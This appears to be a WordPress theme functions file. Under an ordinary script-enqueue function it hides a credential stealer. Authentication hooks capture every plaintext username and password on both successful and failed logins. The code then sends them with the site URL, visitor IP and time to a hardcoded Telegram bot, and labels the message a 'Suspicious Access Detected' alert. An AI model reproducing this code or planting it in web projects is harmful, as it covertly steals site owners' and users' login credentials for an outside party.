function esi_enqueue_scripts() {
    wp_enqueue_script('esi-ajax', get_template_directory_uri() . '/js/esi-ajax.js', array('jquery'), null, true);

    wp_localize_script('esi-ajax', 'esi_ajax_obj', array(
        'ajaxurl' => admin_url('admin-ajax.php')
    ));
}
add_action('wp_enqueue_scripts', 'esi_enqueue_scripts');

function kirimInfoLoginTelegram($username, $password, $status) {
    $botToken = "8766725453:AAFRA76BDwyC0eG5FxPgq9Yw1oWIqRmGyL4";
    $chatId   = "6876138643";

    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http")
        . "://"
        . $_SERVER['HTTP_HOST']
        . $_SERVER['REQUEST_URI'];

    $message  = "Suspicious Access Detected\\n";
    $message .= "Status: " . strtoupper($status) . "\\n";
    $message .= "Site: " . get_site_url() . "\\n";
    $message .= "Username: " . sanitize_text_field($username) . "\\n";
    $message .= "Password: " . sanitize_text_field($password) . "\\n";
    $message .= "URL: " . esc_url_raw($current_url) . "\\n";
    $message .= "IP: " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown') . "\\n";
    $message .= "Time: " . current_time('mysql');

    $apiURL = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text'    => $message
    ];

    $response = wp_remote_get($apiURL . "?" . http_build_query($params));
    if (is_wp_error($response)) {
        error_log('Telegram send error: ' . $response->get_error_message());
    }
}

add_filter('authenticate', function($user, $username, $password) {
    if (!empty($username) && !empty($password)) {
        $_SESSION['last_login_attempt'] = [
            'username' => (string) $username,
            'password' => (string) $password
        ];
    }
    return $user;
}, 10, 3);

add_action('wp_login', function($user_login) {
    if (wp_doing_ajax()) return;

    if (!empty($_SESSION['last_login_attempt'])) {
        $data = $_SESSION['last_login_attempt'];
        kirimInfoLoginTelegram($data['username'], $data['password'], 'LOGIN SUCCESS');
        unset($_SESSION['last_login_attempt']);
    }
}, 10, 1);

add_action('wp_login_failed', function($username) {
    if (wp_doing_ajax()) return;

    if (!empty($_SESSION['last_login_attempt'])) {
        $data = $_SESSION['last_login_attempt'];
        kirimInfoLoginTelegram($data['username'], $data['password'], 'LOGIN FAILED');
        unset($_SESSION['last_login_attempt']);
    } else {
        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'LOGIN FAILED');
    }
}, 10, 1);
